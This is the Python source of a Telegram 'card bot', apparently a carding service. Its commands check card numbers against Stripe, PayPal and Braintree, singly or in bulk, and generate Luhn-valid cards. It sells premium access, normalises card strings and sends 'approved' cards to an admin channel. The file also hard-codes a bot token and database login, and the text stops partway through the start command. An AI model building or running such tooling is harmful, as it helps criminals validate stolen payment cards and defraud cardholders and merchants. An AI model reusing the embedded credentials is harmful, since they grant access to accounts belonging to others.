from gen import CardGenerator
import telebot
from flask import Flask
import threading
import re
import os
import time
import json
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
from p import check_card
from ch import check_card_stripe, check_cards_stripe
from payp import check_card_paypal  # Import the PayPal checker
import mysql.connector
from mysql.connector import pooling

# Database connection pool
db_pool = pooling.MySQLConnectionPool(
    pool_name="bot_pool",
    pool_size=5,
    pool_reset_session=True,
    host="sql12.freesqldatabase.com",
    user="sql12802422",
    password="JJ3hSnN2aC",
    database="sql12802422",
    port=3306,
    autocommit=True
)

# Database connection function with connection pooling
def connect_db():
    try:
        return db_pool.get_connection()
    except mysql.connector.Error as err:
        print(f"Database connection error: {err}")
        return None

# Add this function to send notifications to admin
def notify_admin(message):
    """Send notification to main admin"""
    try:
        bot.send_message(MAIN_ADMIN_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send admin notification: {e}")

# Add this function to send approved cards to channel
def notify_channel(message):
    """Send approved card to channel"""
    try:
        bot.send_message(CHANNEL_ID, message, parse_mode='HTML')
    except Exception as e:
        print(f"Failed to send channel notification: {e}")

# Cache for frequently accessed data
user_cache = {}
cache_timeout = 300  # 5 minutes

def add_free_user(user_id, first_name):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT IGNORE INTO free_users (user_id, first_name) VALUES (%s, %s)",
            (user_id, first_name)
        )
        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error adding free user: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def store_key(key, validity_days):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO premium_keys (`key`, validity_days) VALUES (%s, %s)",
            (key, validity_days)
        )
        conn.commit()
        return True
    except Exception as e:
        print(f"Error storing key: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def is_key_valid(key):
    conn = connect_db()
    if not conn:
        return None
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute(
            "SELECT * FROM premium_keys WHERE `key` = %s AND used_by IS NULL",
            (key,)
        )
        result = cursor.fetchone()
        return result
    except Exception as e:
        print(f"Error checking key validity: {e}")
        return None
    finally:
        if conn.is_connected():
            conn.close()

def mark_key_as_used(key, user_id):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE premium_keys SET used_by = %s, used_at = NOW() WHERE `key` = %s",
            (user_id, key)
        )
        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error marking key as used: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def add_premium(user_id, first_name, validity_days):
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor()
        expiry_date = datetime.now() + timedelta(days=validity_days)

        cursor.execute("""
            INSERT INTO premium_users (user_id, first_name, subscription_expiry)
            VALUES (%s, %s, %s)
            ON DUPLICATE KEY UPDATE
                first_name = VALUES(first_name),
                subscription_start = CURRENT_TIMESTAMP,
                subscription_expiry = VALUES(subscription_expiry)
        """, (user_id, first_name, expiry_date))

        conn.commit()
        # Clear cache for this user
        user_id_str = str(user_id)
        for key in list(user_cache.keys()):
            if user_id_str in key:
                del user_cache[key]
        return True
    except Exception as e:
        print(f"Error adding premium user: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

def is_premium(user_id):
    """Check if user has premium subscription"""
    # Admins are always premium
    if is_admin(user_id):
        return True
    
    # Check cache first
    cache_key = f"premium_{user_id}"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    # Check premium_users table
    conn = connect_db()
    if not conn:
        return False
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()

        premium_result = False
        if result:
            expiry = result['subscription_expiry']
            if expiry is None:
                premium_result = False
            else:
                # Convert to datetime object if it's a string
                if isinstance(expiry, str):
                    expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                premium_result = expiry > datetime.now()
        
        # Cache the result
        user_cache[cache_key] = {'result': premium_result, 'time': time.time()}
        return premium_result
    except Exception as e:
        print(f"Error checking premium status: {e}")
        return False
    finally:
        if conn.is_connected():
            conn.close()

card_generator = CardGenerator()

# BOT Configuration
BOT_TOKEN = '8374941881:AAGI8cU4W85SEN0WbEvg_eTZiGZdvXAmVCk'
MAIN_ADMIN_ID = 5103348494
CHANNEL_ID = 5103348494  # Your channel ID

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=10)

FREE_USER_COOLDOWN = {}  # For anti-spam system

# ---------------- Helper Functions ---------------- #

def load_admins():
    """Load admin list from database"""
    cache_key = "admins_list"
    if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
        return user_cache[cache_key]['result']
    
    try:
        conn = connect_db()
        if not conn:
            return [MAIN_ADMIN_ID]
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM admins")
        admins = [row[0] for row in cursor.fetchall()]
        # Cache the result
        user_cache[cache_key] = {'result': admins, 'time': time.time()}
        return admins
    except Exception as e:
        print(f"Error loading admins: {e}")
        return [MAIN_ADMIN_ID]
    finally:
        if conn and conn.is_connected():
            conn.close()

def save_admins(admins):
    """Save admin list to database"""
    try:
        conn = connect_db()
        if not conn:
            return False
        cursor = conn.cursor()
        
        # Clear existing admins
        cursor.execute("DELETE FROM admins")
        
        # Insert new admins
        for admin_id in admins:
            cursor.execute("INSERT INTO admins (user_id) VALUES (%s)", (admin_id,))
        
        conn.commit()
        # Clear cache
        if "admins_list" in user_cache:
            del user_cache["admins_list"]
        return True
    except Exception as e:
        print(f"Error saving admins: {e}")
        return False
    finally:
        if conn and conn.is_connected():
            conn.close()

def is_admin(user_id):
    """Check if user is an admin"""
    # Convert to int for comparison
    try:
        user_id_int = int(user_id)
    except (ValueError, TypeError):
        return False
        
    # Always check MAIN_ADMIN_ID first
    if user_id_int == MAIN_ADMIN_ID:
        return True
        
    admins = load_admins()
    return user_id_int in admins

def is_authorized(msg):
    """Check if user is authorized"""
    user_id = msg.from_user.id
    chat = msg.chat

    # ✅ Allow all admins anywhere
    if is_admin(user_id):
        return True

    # ✅ Allow all premium users
    if is_premium(user_id):
        return True

    # ✅ If message is from group and group is authorized
    if chat.type in ["group", "supergroup"]:
        return is_group_authorized(chat.id)

    # ✅ If private chat, check if user is in free_users table
    if chat.type == "private":
        # Check cache first
        cache_key = f"free_user_{user_id}"
        if cache_key in user_cache and time.time() - user_cache[cache_key]['time'] < cache_timeout:
            return user_cache[cache_key]['result']
            
        conn = connect_db()
        if not conn:
            return False
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
            result = cursor.fetchone()
            # Cache the result
            user_cache[cache_key] = {'result': result is not None, 'time': time.time()}
            return result is not None
        except Exception as e:
            print(f"Error checking free user: {e}")
            return False
        finally:
            if conn.is_connected():
                conn.close()

    return False

def normalize_card(text):
    """
    Normalize credit card from any format to cc|mm|yy|cvv
    Similar to PHP normalize_card function
    """
    if not text:
        return None

    # Replace newlines and slashes with spaces
    text = text.replace('\n', ' ').replace('/', ' ')

    # Find all numbers in the text
    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for part in numbers:
        if len(part) == 16:  # Credit card number
            cc = part
        elif len(part) == 4 and part.startswith('20'):  # 4-digit year starting with 20
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':  # Month (2 digits <= 12)
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':  # 2-digit year
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':  # CVV (3-4 digits)
            cvv = part

    # Check if we have all required parts
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"

    return None

def get_user_info(user_id):
    """Get user info for display in responses"""
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"User {user_id}"
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        # Check admin status first, before other checks
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            # Check if user is in free_users table
            conn = connect_db()
            if not conn:
                user_type = "Unknown User ❓"
            else:
                try:
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
                    free_user = cursor.fetchone()
                    
                    if free_user:
                        user_type = "Free User 🔓"
                    else:
                        user_type = "Unauthorized User ❌"
                except Exception as e:
                    print(f"Error checking user type: {e}")
                    user_type = "Unknown User ❓"
                finally:
                    if conn.is_connected():
                        conn.close()
                
        return {
            "username": username,
            "full_name": full_name,
            "user_type": user_type,
            "user_id": user_id
        }
        
    except:
        if is_admin(user_id):
            user_type = "Admin 👑"
        elif is_premium(user_id):
            user_type = "Premium User 💰"
        else:
            user_type = "Unknown User ❓"
                
        return {
            "username": f"User {user_id}",
            "full_name": f"User {user_id}",
            "user_type": user_type,
            "user_id": user_id
        }

def check_proxy_status():
    """Check if proxy is live or dead"""
    try:
        # Simple check by trying to access a reliable site
        import requests
        test_url = "https://www.google.com"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            return "Live ✅"
        else:
            return "Dead ❌"
    except:
        return "Dead ❌"

def get_subscription_info(user_id):
    """Get subscription information for a user"""
    if is_admin(user_id):
        return ("Unlimited ♾️", "Never")
    
    # Check premium_users table
    conn = connect_db()
    if not conn:
        return ("Error ❌", "N/A")
        
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT subscription_expiry FROM premium_users WHERE user_id = %s", (user_id,))
        result_db = cursor.fetchone()

        if result_db:
            expiry = result_db['subscription_expiry']
            if expiry is None:
                return ("No subscription ❌", "N/A")
            else:
                # Convert to datetime object if it's a string
                if isinstance(expiry, str):
                    expiry = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                
                remaining_days = (expiry - datetime.now()).days
                if remaining_days < 0:
                    return ("Expired ❌", expiry.strftime("%Y-%m-%d %H:%M:%S"))
                else:
                    return (f"{remaining_days} days", expiry.strftime("%Y-%m-%d %H:%M:%S"))
        else:
            return ("No subscription ❌", "N/A")
    except Exception as e:
        print(f"Error getting subscription info: {e}")
        return ("Error ❌", "N/A")
    finally:
        if conn.is_connected():
            conn.close()

def check_cooldown(user_id, command_type):
    """Check if user is in cooldown period"""
    current_time = time.time()
    user_id_str = str(user_id)
    
    # Admins and premium users have no cooldown
    if is_admin(user_id) or is_premium(user_id):
        return False
        
    # Check if user is in cooldown
    if user_id_str in FREE_USER_COOLDOWN:
        if command_type in FREE_USER_COOLDOWN[user_id_str]:
            if current_time < FREE_USER_COOLDOWN[user_id_str][command_type]:
                return True
    
    return False

def set_cooldown(user_id, command_type, duration):
    """Set cooldown for a user"""
    user_id_str = str(user_id)
    
    # Don't set cooldown for admins and premium users
    if is_admin(user_id) or is_premium(user_id):
        return
    
    if user_id_str not in FREE_USER_COOLDOWN:
        FREE_USER_COOLDOWN[user_id_str] = {}
    
    FREE_USER_COOLDOWN[user_id_str][command_type] = time.time() + duration

# For groups
GROUPS_FILE = 'authorized_groups.json'

def load_authorized_groups():
    if not os.path.exists(GROUPS_FILE):
        return []
    try:
        with open(GROUPS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_authorized_groups(groups):
    try:
        with open(GROUPS_FILE, 'w') as f:
            json.dump(groups, f)
    except Exception as e:
        print(f"Error saving authorized groups: {e}")

def is_group_authorized(group_id):
    return group_id in load_authorized_groups()

# ---------------- New Help Command ---------------- #

@bot.message_handler(commands=['help'])
def help_command(msg):
    """Show bot status and commands with inline button"""
    user_id = msg.from_user.id
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    proxy_status = check_proxy_status()
    
    # Create inline keyboard
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("📋 Check Commands", callback_data="show_commands"),
        InlineKeyboardButton("💎 Premium Plans", callback_data="premium_plans"),
        InlineKeyboardButton("👤 User Info", callback_data="user_info"),
        InlineKeyboardButton("🆘 Support", url="https://t.me/mhitzxg")
    ]
    keyboard.add(buttons[0], buttons[1])
    keyboard.add(buttons[2], buttons[3])
    
    help_message = f"""
╔═══════════════════════╗
        🤖 BOT STATUS & HELP 🤖
╚═══════════════════════╝

👤 USER INFORMATION:
• Name: {user_data['full_name']}
• ID: `{user_data['user_id']}`
• Type: {user_data['user_type']}
• Username: {user_data['username']}

📊 SYSTEM STATUS:
• Bot: Online ✅
• Proxy: {proxy_status}
• Subscription: {remaining}
• Expiry: {expiry_date}
• Time: {current_time}

💡 Click the button below to see all available commands!

⚡ Powered by @mhitzxg & @pr0xy_xd
"""
    
    bot.reply_to(msg, help_message, reply_markup=keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "show_commands")
def show_commands(call):
    """Show all available commands"""
    commands_list = """
╔═══════════════════════╗
        📋 ALL COMMANDS 📋
╚═══════════════════════╝

🛒 CARD CHECKING COMMANDS:

• /br - Check single card (Braintree) ❌
• /mbr - Mass check cards (Braintree) ❌
• /ch - Check single card (Stripe) ✅
• /mch - Mass check cards (Stripe) ✅
• /pp - Check single card (PayPal) ✅
• /mpp - Mass check cards (PayPal) ✅

🎰 CARD GENERATION:
• /gen - Generate valid cards using Luhn algorithm

👤 USER COMMANDS:
• /start - Start the bot
• /info - Show your account information
• /help - Show this help message
• /ping - Check bot response time
• /register - Register as free user
• /subscription - View premium plans
• /redeem - Redeem premium key

👑 ADMIN COMMANDS:
• /auth - Authorize user
• /unauth - Unauthorize user
• /listfree - List free users
• /addadmin - Add admin
• /removeadmin - Remove admin
• /listadmins - List all admins
• /genkey - Generate premium key
• /authgroup - Authorize group

💡 Usage Examples:
• `/ch 4556737586899855|12|2026|123`
• `/gen 483318`
• Reply to message with `/ch` or `/br`

⚡ Powered by @mhitzxg & @pr0xy_xd
"""
    
    bot.edit_message_text(
        commands_list,
        call.message.chat.id,
        call.message.message_id,
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data == "premium_plans")
def show_premium_plans(call):
    """Show premium plans"""
    plans_message = """
╔═══════════════════════╗
        💎 PREMIUM PLANS 💎
╚═══════════════════════╝

💰 PREMIUM FEATURES:
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀
• No limitations ✅
• Remove all cooldowns ⏰

📋 PREMIUM PLANS:
• 7 days - $3 💵
• 30 days - $10 💵

🎫 HOW TO GET PREMIUM:
1. Contact @mhitzxg
2. Choose your plan
3. Make payment
4. Receive premium key
5. Use /redeem <key>

🔓 FREE TIER:
• 25 cards per check 📊
• Standard speed 🐢
• Cooldown periods ⏰

⚡ Upgrade now for better experience!
"""
    
    bot.edit_message_text(
        plans_message,
        call.message.chat.id,
        call.message.message_id,
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data == "user_info")
def show_user_info(call):
    """Show user information in callback"""
    user_id = call.from_user.id
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    user_info_message = f"""
╔═══════════════════════╗
        👤 USER INFORMATION 👤
╚═══════════════════════╝

👤 Name: {user_data['full_name']}
🆔 User ID: `{user_data['user_id']}`
📱 Username: {user_data['username']}
🎫 Account Type: {user_data['user_type']}

💰 Subscription: {remaining}
📅 Expiry Date: {expiry_date}
⏰ Current Time: {current_time}

🌐 STATUS 🌐
🔌 Proxy: {check_proxy_status()}
🔓 Authorized: {'Yes ✅' if is_authorized(call.message) else 'No ❌'}

⚡ Powered by @mhitzxg
"""
    
    bot.edit_message_text(
        user_info_message,
        call.message.chat.id,
        call.message.message_id,
        parse_mode='Markdown'
    )

# ---------------- Ping Command ---------------- #

@bot.message_handler(commands=['ping'])
def ping_command(msg):
    """Check bot response time"""
    start_time = time.time()
    
    # Send initial message
    ping_msg = bot.reply_to(msg, "🏓 Pinging...")
    
    end_time = time.time()
    ping_time = round((end_time - start_time) * 1000, 2)
    
    # Get bot status information
    user_data = get_user_info(msg.from_user.id)
    proxy_status = check_proxy_status()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    ping_result = f"""
╔═══════════════════════╗
        🏓 PONG! 🏓
╚═══════════════════════╝

📊 RESPONSE TIME:
• Ping: {ping_time}ms
• Status: Online ✅
• Proxy: {proxy_status}
• Time: {current_time}

👤 USER INFO:
• Name: {user_data['full_name']}
• Type: {user_data['user_type']}

⚡ Bot is running smoothly!
💡 Use /help for all commands

🔧 Powered by @mhitzxg & @pr0xy_xd
"""
    
    bot.edit_message_text(
        ping_result,
        msg.chat.id,
        ping_msg.message_id,
        parse_mode='Markdown'
    )

# ---------------- Admin Commands ---------------- #
@bot.message_handler(commands=['addadmin'])
def add_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can add other admins
• Contact the main admin: @mhitzxg""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/addadmin <user_id>`
• Example: `/addadmin 1234567890`""")
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id in admins:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ ALREADY ADMIN ❌
╚═══════════════════════╝

• This user is already an admin""")
        
        admins.append(user_id)
        if save_admins(admins):
            bot.reply_to(msg, f"""
╔═══════════════════════╗
     ✅ ADMIN ADDED ✅
╚═══════════════════════╝

• Successfully added `{user_id}` as admin
• Total admins: {len(admins)}""")
        else:
            bot.reply_to(msg, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to save admin to database""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/addadmin 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")
@bot.message_handler(commands=['removeadmin'])
def remove_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
      🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can remove other admins
• Contact the main admin: @mhitzxg""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/removeadmin <user_id>`
• Example: `/removeadmin 1234567890`""")
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id == MAIN_ADMIN_ID:
            return bot.reply_to(msg, """
  ╔═══════════════════════╗
❌ CANNOT REMOVE MAIN ADMIN ❌
  ╚═══════════════════════╝
 
• You cannot remove the main admin""")
        
        if user_id not in admins:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ NOT AN ADMIN ❌
╚═══════════════════════╝

• This user is not an admin""")
        
        admins.remove(user_id)
        if save_admins(admins):
            bot.reply_to(msg, f"""
╔═══════════════════════╗
 ✅ ADMIN REMOVED ✅
╚═══════════════════════╝

• Successfully removed `{user_id}` from admins
• Total admins: {len(admins)}""")
        else:
            bot.reply_to(msg, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to save admin changes to database""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
 ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/removeadmin 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔══════════════════════╗
    ⚠️ ERROR ⚠️
╚══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['unauth'])
def unauth_user(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can unauthorize users
• Contact an admin for assistance""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/unauth <user_id>`
• Example: `/unauth 1234567890`""")
        
        user_id = int(parts[1])
        
        # Remove user from free_users table
        conn = connect_db()
        if not conn:
            return bot.reply_to(msg, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Cannot connect to database""")
            
        cursor = conn.cursor()
        cursor.execute("DELETE FROM free_users WHERE user_id = %s", (user_id,))
        conn.commit()
        
        if cursor.rowcount > 0:
            # Clear cache
            cache_key = f"free_user_{user_id}"
            if cache_key in user_cache:
                del user_cache[cache_key]
                
            bot.reply_to(msg, f"""
╔═══════════════════════╗
   ✅ USER UNAUTHORIZED ✅
╚═══════════════════════╝

• Successfully removed authorization for user: `{user_id}`
• User can no longer use the bot in private chats""")
        else:
            bot.reply_to(msg, f"""
╔═══════════════════════╗
  ❌ USER NOT FOUND ❌
╚═══════════════════════╝

• User `{user_id}` was not found in the authorized users list
• No action taken""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/unauth 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['listfree'])
def list_free_users(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can view the free users list
• Contact an admin for assistance""")
    
    try:
        conn = connect_db()
        if not conn:
            return bot.reply_to(msg, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Cannot connect to database""")
            
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, first_name FROM free_users ORDER BY user_id")
        free_users = cursor.fetchall()
        
        if not free_users:
            return bot.reply_to(msg, """
╔═══════════════════════╗
   📋 NO FREE USERS 📋
╚═══════════════════════╝

• There are no authorized free users""")
        
        user_list = ""
        for user_id, first_name in free_users:
            user_list += f"• `{user_id}` - {first_name}\n"
        
        bot.reply_to(msg, f"""
╔═══════════════════════╗
   📋 FREE USERS LIST 📋
╚═══════════════════════╝

{user_list}
• Total free users: {len(free_users)}""")
        
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['listadmins'])
def list_admins(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can view the admin list
• Contact an admin to get access""")
    
    admins = load_admins()
    if not admins:
        return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ NO ADMINS ❌
╚═══════════════════════╝

• There are no admins configured""")
    
    admin_list = ""
    for i, admin_id in enumerate(admins, 1):
        if admin_id == MAIN_ADMIN_ID:
            admin_list += f"• `{admin_id}` (Main Admin) 👑\n"
        else:
            admin_list += f"• `{admin_id}`\n"
    
    bot.reply_to(msg, f"""
╔═══════════════════════╗
   📋 ADMIN LIST 📋
╚═══════════════════════╝

{admin_list}
• Total admins: {len(admins)}""")

@bot.message_handler(commands=['authgroup'])
def authorize_group(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can authorize groups
• Contact the main admin: @mhitzxg""")
    
    if msg.chat.type not in ["group", "supergroup"]:
        return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚠️ GROUP REQUIRED ⚠️
╚═══════════════════════╝

• This command can only be used in groups""")
    
    group_id = msg.chat.id
    authorized_groups = load_authorized_groups()
    
    if group_id in authorized_groups:
        return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ ALREADY AUTHORIZED ❌
╚═══════════════════════╝

• This group is already authorized""")
    
    authorized_groups.append(group_id)
    save_authorized_groups(authorized_groups)
    
    bot.reply_to(msg, f"""
╔═══════════════════════╗
  ✅ GROUP AUTHORIZED ✅
╚═══════════════════════╝

• Group ID: `{group_id}`
• Group name: {msg.chat.title}
• All members can now use the bot in this group""")

@bot.message_handler(commands=['genkey'])
def generate_key(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only the main admin can generate premium keys
• Contact the main admin: @mhitzxg""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/genkey <days>`
• Example: `/genkey 30`""")
        
        days = int(parts[1])
        if days <= 0:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID DAYS ❌
╚═══════════════════════╝

• Please provide a positive number of days
• Example: `/genkey 30`""")
        
        # Generate a random key
        key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
        
        if store_key(key, days):
            bot.reply_to(msg, f"""
╔═══════════════════════╗
  🔑 PREMIUM KEY GENERATED 🔑
╚═══════════════════════╝

• Key: `{key}`
• Validity: {days} days
• Share this key with premium users

💡 Usage:
• User can redeem with: `/redeem {key}`""")
        else:
            bot.reply_to(msg, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to generate premium key
• Please try again""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
  ❌ INVALID DAYS ❌
╚═══════════════════════╝

• Please provide a valid number of days
• Usage: `/genkey 30`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")

@bot.message_handler(commands=['auth'])
def auth_user(msg):
    if not is_admin(msg.from_user.id):
        return bot.reply_to(msg, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can authorize users
• Contact an admin to get access""")
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return bot.reply_to(msg, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/auth <user_id>`
• Example: `/auth 1234567890`""")
        
        user_id = int(parts[1])
        
        # Get user info
        try:
            user = bot.get_chat(user_id)
            first_name = user.first_name or "Unknown"
        except:
            first_name = "Unknown"
        
        if add_free_user(user_id, first_name):
            bot.reply_to(msg, f"""
╔═══════════════════════╗
   ✅ USER AUTHORIZED ✅
╚═══════════════════════╝

• User ID: `{user_id}`
• Name: {first_name}
• User can now use the bot in private chats""")
        else:
            bot.reply_to(msg, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to authorize user
• Please try again""")
        
    except ValueError:
        bot.reply_to(msg, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/auth 1234567890`""")
    except Exception as e:
        bot.reply_to(msg, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""")

# ---------------- User Commands ---------------- #

@bot.message_handler(commands=['start'])
def start_command(msg):
    user_id = msg.from_user.id
    chat = msg.chat
    
    # Check authorization
    if not is_authorized(msg):
        if chat.type == "private":
            return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ ACCESS DENIED ❌
╚═══════════════════════╝

• You are not authorized to use this bot
• Contact @mhitzxg to get access
• Use /register to get free access""")
        else:
            return bot.reply_to(msg, """
╔═══════════════════════╗
   ❌ ACCESS DENIED ❌
╚═══════════════════════╝

• This group is not authorized to use this bot
• Contact admin to authorize this group""")
    
    # Get user info
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    
    # Create inline keyboard
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("📋 Check Commands", callback_data="show_commands"),
        InlineKeyboardButton("💎 Premium Plans", callback_data="premium_plans"),
        InlineKeyboardButton("👤 User Info", callback_data="user_info"),
        InlineKeyboardButton("🆘 Support", url="https://t.me/mhitzxg")
    ]
    keyboard.add(buttons[0], buttons[1])
    keyboard.add(buttons[2], buttons[3])
    
    welcome_message = f"""
╔═══════════════════════╗
        🤖 WELCOME TO CARD BOT! 🤖
╚═══════════════════════╝

